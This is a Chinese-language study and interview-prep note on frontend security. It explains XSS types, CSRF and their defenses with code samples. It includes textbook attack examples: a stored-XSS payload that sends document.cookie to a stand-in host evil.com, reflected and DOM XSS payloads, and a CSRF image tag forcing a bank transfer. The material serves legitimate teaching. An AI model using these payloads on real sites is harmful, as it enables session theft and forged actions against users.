---
type: review
related_to: "[[前端安全]]"
---

# 前端安全（XSS 与 CSRF）

## 什么是 XSS

**XSS（Cross-Site Scripting，跨站脚本攻击）**：攻击者将恶意脚本注入到网页中，当其他用户访问该页面时，脚本在用户浏览器中执行，从而窃取数据、劫持会话或进行其他恶意操作。

> 为什么不叫 CSS？因为 CSS 已经被层叠样式表占用了，所以叫 XSS。

## XSS 的三种类型

### 1. 存储型 XSS（Stored XSS）

恶意脚本**被存储到服务器**（数据库、评论、用户资料等），所有访问该页面的用户都会执行恶意代码。

```
攻击流程：
1. 攻击者在评论区提交：<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>
2. 服务器存入数据库
3. 其他用户访问该页面 → 浏览器渲染时执行恶意脚本
4. 用户的 cookie 被发送到攻击者服务器
```

**危害最大**，影响所有访问用户。

### 2. 反射型 XSS（Reflected XSS）

恶意脚本在 **URL 参数**中，服务器将参数直接拼接到 HTML 中返回，脚本在用户点击恶意链接时执行。

```
攻击流程：
1. 攻击者构造恶意链接：
   https://example.com/search?q=<script>alert('XSS')</script>
2. 用户点击链接 → 服务器将 q 参数直接插入响应
3. 浏览器执行恶意脚本
```

**需要用户主动点击**恶意链接。

### 3. DOM 型 XSS（DOM-based XSS）

恶意脚本**完全在前端处理**，通过修改 DOM 结构执行，不经过服务器。

```javascript
// 危险代码示例
const url = new URL(window.location.href)
const name = url.searchParams.get('name')
document.getElementById('greeting').innerHTML = 'Hello, ' + name

// 攻击链接：
// https://example.com?name=<img src=x onerror=alert('XSS')>
```

**服务器完全不参与**，纯前端漏洞。

## XSS 攻击的危害

| 危害 | 说明 |
|------|------|
| **窃取 Cookie** | 获取用户登录凭证，冒充用户身份 |
| **劫持会话** | 利用 session token 登录用户账号 |
| **键盘记录** | 监听键盘事件，获取输入的密码、银行卡号 |
| **钓鱼攻击** | 伪造登录弹窗，诱骗用户输入账号密码 |
| **挖矿脚本** | 在用户浏览器中运行加密货币挖矿 |
| **蠕虫传播** | 自动发布带恶意代码的内容，感染更多用户 |

## XSS 防御方案

### 1. 输出编码（最基础）

对用户输入进行转义，使其作为**文本**而非**代码**执行。

```javascript
// HTML 编码
function escapeHtml(str) {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#39;',
    '/': '&#x2F;'
  }
  return str.replace(/[&<>"'/]/g, (m) => map[m])
}

// 使用
const userInput = '<script>alert("XSS")</script>'
document.getElementById('output').textContent = userInput  // ✅ 安全
document.getElementById('output').innerHTML = escapeHtml(userInput)  // ✅ 安全
document.getElementById('output').innerHTML = userInput  // ❌ 危险！
```

### 2. CSP（Content Security Policy）

通过 HTTP 响应头限制页面可以加载和执行的资源。

```
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-abc123' https://cdn.example.com; style-src 'self' 'unsafe-inline'
```

| 指令 | 作用 |
|------|------|
| `script-src` | 限制 JavaScript 来源 |
| `style-src` | 限制 CSS 来源 |
| `img-src` | 限制图片来源 |
| `connect-src` | 限制 fetch/XHR/WebSocket 来源 |
| `frame-ancestors` | 限制谁可以嵌入当前页面（防点击劫持） |
| `report-uri` | 违规时上报地址 |

**禁止内联脚本**是最有效的 XSS 防御：

```
Content-Security-Policy: script-src 'self'
```

这样 `<script>alert('XSS')</script>` 直接失效。

### 3. HttpOnly Cookie

设置 Cookie 的 `HttpOnly` 属性，**禁止 JavaScript 访问**。

```http
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
```

```javascript
document.cookie  // 无法读取 HttpOnly 的 Cookie
```

**只能防止 Cookie 窃取**，不能阻止其他 XSS 攻击。

### 4. 输入验证（白名单）

对用户输入进行**格式验证**，只允许预期的格式。

```javascript
// 验证用户名：只允许字母、数字、下划线
function validateUsername(username) {
  return /^[a-zA-Z0-9_]{3,20}$/.test(username)
}

// 验证邮箱
function validateEmail(email) {
  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)
}
```

**白名单优于黑名单**，不要试图列举所有危险字符。

### 5. 使用安全的 API

```javascript
// ✅ 安全：textContent 不会解析 HTML
element.textContent = userInput

// ❌ 危险：innerHTML 会解析 HTML
element.innerHTML = userInput

// ✅ 安全：setAttribute 自动编码
element.setAttribute('data-value', userInput)

// ❌ 危险：直接拼接属性
element.innerHTML = `<div data-value="${userInput}">`
```

---

## 什么是 CSRF

**CSRF（Cross-Site Request Forgery，跨站请求伪造）**：攻击者诱导用户在已登录的网站上执行非本意的操作。利用的是**浏览器自动携带 Cookie** 的机制。

```
攻击流程：
1. 用户登录了银行网站 bank.com，获得 Cookie
2. 用户访问恶意网站 evil.com（未退出银行）
3. 恶意网站页面中有隐藏的表单/请求：
   <img src="https://bank.com/transfer?to=hacker&amount=10000">
4. 浏览器自动携带 bank.com 的 Cookie 发起请求
5. 银行服务器验证 Cookie 有效 → 执行转账
```

**关键点**：攻击者**无法读取**响应，只能**发起**请求。

## CSRF 与 XSS 的区别

| 维度 | XSS | CSRF |
|------|-----|------|
| **全称** | Cross-Site Scripting | Cross-Site Request Forgery |
| **攻击方式** | 注入恶意脚本 | 伪造用户请求 |
| **利用点** | 用户对网站的信任 | 网站对用户浏览器的信任 |
| **能否读取数据** | 能 | 不能 |
| **执行环境** | 在目标网站上下文执行 | 在恶意网站上下文执行 |
| **防御核心** | 输出编码 + CSP | 验证请求来源 + Token |

## CSRF 防御方案

### 1. CSRF Token

服务器生成随机 Token，嵌入表单，提交时验证。

```html
<!-- 服务器渲染表单时插入 Token -->
<form action="/transfer" method="POST">
  <input type="hidden" name="_csrf" value="a1b2c3d4e5f6">
  <input type="text" name="amount">
  <button>转账</button>
</form>
```

```javascript
// 服务端验证（Node.js + Express）
app.post('/transfer', (req, res) => {
  if (req.body._csrf !== req.session.csrfToken) {
    return res.status(403).json({ error: 'Invalid CSRF token' })
  }
  // 执行转账...
})
```

**攻击者无法获取 Token**（受同源策略限制），所以无法伪造请求。

### 2. SameSite Cookie

限制 Cookie 在跨站请求中的发送。

```http
Set-Cookie: session=abc123; SameSite=Strict; Secure
```

| 值 | 行为 |
|------|------|
| `Strict` | 跨站请求**完全不发送** Cookie |
| `Lax` | 跨站的 GET 请求发送，POST 不发送（**默认值**） |
| `None` | 跨站请求也发送（必须配合 `Secure`） |

```javascript
// Lax 模式下：
// ✅ <a href="bank.com"> 点击跳转 → 发送 Cookie
// ✅ GET 表单提交 → 发送 Cookie
// ❌ POST 表单提交 → 不发送 Cookie
// ❌ <img src="bank.com"> → 不发送 Cookie
// ❌ fetch/axios 请求 → 不发送 Cookie
```

**Lax 是 Chrome 80+ 的默认值**，已经能防御大部分 CSRF。

### 3. 验证 Origin / Referer

服务器检查请求头中的 `Origin` 或 `Referer`。

```javascript
app.use((req, res, next) => {
  const origin = req.headers.origin || req.headers.referer
  const allowed = ['https://mysite.com', 'https://www.mysite.com']

  if (!origin || !allowed.some(o => origin.startsWith(o))) {
    return res.status(403).json({ error: 'CSRF detected' })
  }
  next()
})
```

**缺点**：某些浏览器/代理可能不发送或修改 Referer。

### 4. 双重 Cookie 验证

将 Cookie 值放在请求参数中，服务器比对 Cookie 和参数是否一致。

```javascript
// 前端：从 Cookie 读取 token 放到请求头
const csrfToken = getCookie('csrf_token')
fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'X-CSRF-Token': csrfToken
  },
  body: JSON.stringify({ amount: 100 })
})

// 服务端：比对 Cookie 中的 token 和请求头中的 token
const cookieToken = req.cookies.csrf_token
const headerToken = req.headers['x-csrf-token']
if (cookieToken !== headerToken) {
  return res.status(403).json({ error: 'CSRF detected' })
}
```

**原理**：攻击者可以发起请求，但**读不到** Cookie 的值（同源策略）。

---

## 防御方案总结

### XSS 防御清单

- [ ] 对所有用户输入进行**输出编码**
- [ ] 部署 **CSP**，禁止内联脚本
- [ ] 敏感 Cookie 设置 **HttpOnly**
- [ ] 使用 **textContent** 替代 innerHTML
- [ ] 输入验证采用**白名单**

### CSRF 防御清单

- [ ] 敏感操作使用 **POST** 方法
- [ ] Cookie 设置 **SameSite=Lax** 或 **Strict**
- [ ] 使用 **CSRF Token**
- [ ] 验证 **Origin/Referer** 头
- [ ] 关键操作增加**二次确认**（如短信验证码）

---

## 面试问题

### 1. 什么是 XSS？有哪几种类型？

**XSS** 是将恶意脚本注入到网页中，在用户浏览器执行。三种类型：

- **存储型**：恶意脚本存到服务器，影响所有用户（最危险）
- **反射型**：恶意脚本在 URL 参数中，需要用户点击链接
- **DOM 型**：纯前端漏洞，通过修改 DOM 执行，不经过服务器

### 2. XSS 的防御措施有哪些？

1. **输出编码**：对用户输入转义，使其作为文本而非代码
2. **CSP**：限制可执行的脚本来源，禁止内联脚本
3. **HttpOnly Cookie**：禁止 JS 读取敏感 Cookie
4. **输入验证**：白名单验证输入格式
5. **安全 API**：用 `textContent` 代替 `innerHTML`

### 3. 什么是 CSRF？如何防御？

**CSRF** 是诱导用户在已登录网站上执行非本意操作，利用浏览器自动携带 Cookie。

防御方法：
1. **CSRF Token**：服务器生成随机 Token，提交时验证
2. **SameSite Cookie**：设置 `SameSite=Lax` 限制跨站发送
3. **验证 Origin/Referer**：检查请求来源
4. **双重 Cookie 验证**：比对 Cookie 和请求参数中的 Token

### 4. CSRF Token 的原理是什么？

1. 服务器生成随机 Token，存入 Session
2. Token 嵌入表单的隐藏字段
3. 用户提交表单时，服务器验证 Token 是否匹配
4. **攻击者无法获取 Token**（受同源策略限制）

### 5. SameSite Cookie 三个值的区别？

| 值 | 行为 | 适用场景 |
|------|------|------|
| `Strict` | 跨站完全不发 Cookie | 安全性最高，但用户体验差（从外部链接进入需重新登录） |
| `Lax` | GET 跨站发送，POST 不发送 | **默认值**，平衡安全与体验 |
| `None` | 跨站也发送（需 Secure） | 需要第三方 Cookie 的场景 |

### 6. XSS 和 CSRF 的核心区别？

- **XSS**：注入脚本，**能读取**数据，利用用户对网站的信任
- **CSRF**：伪造请求，**不能读取**数据，利用网站对浏览器的信任
- **XSS 防御核心**：输出编码
- **CSRF 防御核心**：验证请求来源

### 7. 为什么 CSP 能有效防御 XSS？

CSP 限制了脚本的执行来源：
- 禁止内联脚本：`<script>alert('XSS')</script>` 直接失效
- 限制外部脚本：只允许白名单域名加载 JS
- 禁止 `eval`：阻止动态执行字符串代码

```
Content-Security-Policy: script-src 'self'
```

这是目前最有效的 XSS 防御手段。

### 8. 如果网站只设置了 HttpOnly，能防御 CSRF 吗？

**不能**。HttpOnly 只是禁止 JS 读取 Cookie，但 CSRF 的攻击方式是**发起请求**，浏览器会自动携带 Cookie，不需要 JS 读取。

防御 CSRF 需要 SameSite Cookie、CSRF Token 或验证 Origin。
